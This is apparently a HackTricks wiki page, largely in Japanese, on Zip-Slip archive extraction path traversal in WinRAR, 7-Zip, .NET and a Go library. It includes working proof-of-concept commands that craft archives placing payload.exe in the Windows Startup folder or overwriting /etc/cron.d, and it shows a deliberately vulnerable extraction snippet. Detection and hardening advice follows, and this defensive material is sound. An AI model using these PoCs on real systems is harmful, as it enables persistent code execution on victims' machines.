# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概要

多くのアーカイブ形式（ZIP、RAR、TAR、7-ZIP など）は、各エントリに独自の **internal path** を持たせることができます。抽出ユーティリティがそのパスを無批判に信頼すると、`..` を含む細工されたファイル名や **absolute path**（例: `C:\Windows\System32\`）が、ユーザーが選択したディレクトリの外に書き出されてしまいます。この種の脆弱性は一般に *Zip-Slip* または **archive extraction path traversal** として知られています。

影響は任意ファイルの上書きから、Windows の *Startup* フォルダのような自動実行場所にペイロードを置くことでの直接的な **remote code execution (RCE)** まで多岐にわたります。

## Root Cause

1. 攻撃者が次を含むアーカイブを作成する：
   * 相対トラバーサル列 (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
   * 絶対パス (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
   * またはターゲットディレクトリ外に解決されるように細工された **symlinks**（*nix* 上の ZIP/TAR で一般的）
2. 被害者が埋め込まれたパスを検証せず（または symlink を追跡して）信頼する脆弱なツールでアーカイブを展開する。
3. ファイルが攻撃者制御下の場所に書き込まれ、システムやユーザーがそのパスを次にトリガーしたときに実行／読み込まれる。

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **user-controlled** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName` が `..\\` で始まるとディレクトリトラバーサルが発生します。もしそれが **absolute path** であれば、左側のコンポーネントが完全に破棄され、抽出先として **arbitrary file write** を引き起こします。
- スケジュールされたスキャナにより監視されている同階層の `app` ディレクトリに書き込むための概念実証アーカイブ：
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
その ZIP を監視されている受信トレイに追加すると、`C:\samples\app\0xdf.txt` が生成され、`C:\samples\queue\` の外へのトラバーサルが証明され、後続のプリミティブ（例: DLL hijacks）が可能になります。

## 実例 – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows（`rar` / `unrar` CLI、DLL、およびポータブルソースを含む）は、展開時にファイル名の検証を行いませんでした。
悪意のある RAR アーカイブが次のようなエントリを含んでいる場合:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
選択された出力ディレクトリの**外**に出力され、ユーザーの*Startup*フォルダ内に配置されます。ログオン後、Windowsはそこにあるものを自動的に実行するため、*永続的な* RCE を提供します。

### PoCアーカイブの作成 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – ファイルパスを与えられた通りに保存する（先頭の `./` を削除しないこと）。

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached RAR archives abusing CVE-2025-8088 to deploy customised backdoors and facilitate ransomware operations.

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **脆弱性**: ZIP エントリが **symbolic links** として含まれている場合、展開時に参照解除され、攻撃者が出力先ディレクトリを脱出して任意のパスを上書きできた。ユーザー操作はアーカイブを*開く/展開する*だけでよい。
* **影響対象**: 7-Zip 21.02–24.09（Windows & Linux ビルド）。修正は **25.00**（2025年7月）以降。
* **影響の経路**: `Start Menu/Programs/Startup` やサービス実行箇所を上書き → 次回ログオンやサービス再起動時にコードが実行される。
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
パッチ適用済みビルドでは `/etc/cron.d` は変更されず、シンボリックリンクは /tmp/target 内のリンクとして展開される。

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **脆弱性**: `archiver.Unarchive()` が `../` やシンボリックリンク化された ZIP エントリを追跡し、`outputDir` の外に書き込んでしまう。
* **影響対象**: `github.com/mholt/archiver` ≤ 3.5.1（プロジェクトは現在非推奨）。
* **修正**: `mholt/archives` ≥ 0.1.0 に切り替えるか、書き込み前に正規化（canonical-path）チェックを実装する。
* **最小再現例**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **静的検査** – アーカイブのエントリを列挙し、`../`, `..\\`, *absolute paths* (`/`, `C:`) を含む名前、または展開先ディレクトリの外をターゲットとする *symlink* 型のエントリをフラグする。
* **正規化** – `realpath(join(dest, name))` が依然として `dest` で始まることを確認する。そうでなければ拒否する。
* **サンドボックス展開** – 使い捨てディレクトリに、*safe* な抽出ツール（例: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00）で解凍し、生成されたパスがディレクトリ内にとどまることを検証する。
* **エンドポイント監視** – WinRAR/7-Zip 等でアーカイブが開かれた直後に `Startup`/`Run`/`cron` 配下に新しい実行ファイルが書き込まれた場合にアラートを出す。

## Mitigation & Hardening

1. **抽出ツールを更新する** – WinRAR 7.13+ と 7-Zip 25.00+ はパス/シンボリックリンクのサニタイズを実装している。両ツールとも自動更新機能は依然として欠如している。
2. 可能な場合はアーカイブを“**Do not extract paths**” / “**Ignore paths**” で展開する。
3. Unix では権限を落とし、展開前に **chroot/namespace** をマウントする；Windows では **AppContainer** やサンドボックスを使用する。
4. カスタムコードを記述する場合は、作成/書き込みの**前に** `realpath()`/`PathCanonicalize()` で正規化し、出力先を逸脱するエントリを拒否する。

## Additional Affected / Historical Cases

* 2018 – Snyk による大規模な *Zip-Slip* アドバイザリ（多数の Java/Go/JS ライブラリに影響）。
* 2023 – 7-Zip CVE-2023-4011、`-ao` マージ時の類似トラバーサル。
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) の slugs 内 TAR 展開トラバーサル（v1.2 で修正）。
* 書き込み前に `PathCanonicalize` / `realpath` を呼ばないカスタム抽出ロジック全般。

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
